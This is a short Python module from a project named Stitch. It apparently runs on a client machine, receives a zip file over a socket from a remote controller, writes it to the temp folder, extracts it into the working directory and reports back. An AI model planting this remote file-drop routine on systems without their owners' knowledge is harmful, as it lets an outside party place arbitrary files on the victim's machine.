# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import os
import sys
import zipfile

if win_client():
    temp = 'C:\\Windows\\Temp\\'
else:
    temp = '/tmp/'

dwld_contents = ''
l_filename = receive(client_socket)
if l_filename != 'ERROR':
    d_fin = ''
    zip_loc = os.path.join(temp,l_filename)
    with open (zip_loc,'wb') as load_file:
        while True:
            d_fin = receive(client_socket)
            if d_fin != 'upload complete':
                load_file.write(d_fin)
            else:
                break
    with zipfile.ZipFile(zip_loc, "r") as z:
        z.extractall(os.getcwd())
    os.remove(zip_loc)
    send(client_socket,'[+] Upload Successful!\n')
